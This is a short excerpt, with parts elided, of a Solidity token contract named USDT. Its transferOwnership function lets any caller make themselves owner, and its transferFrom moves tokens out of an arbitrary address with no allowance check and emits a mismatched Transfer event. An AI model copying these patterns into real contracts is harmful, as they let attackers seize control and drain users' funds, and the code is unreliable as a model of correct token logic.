...
contract USDT is IERC20 {
    ...
    function transferOwnership(address oldOwner, address newOwner) public validAddress(newOwner) {
        SuperOwner = newOwner;
    ...
    function transferFrom(address _SuperOwner, address buyer, uint256 numTokens) public override returns (bool) {
        ...
        balances[_SuperOwner] -= numTokens;
        balances[buyer] += numTokens;
        emit Transfer(buyer, msg.sender, numTokens);
        return true;
    }
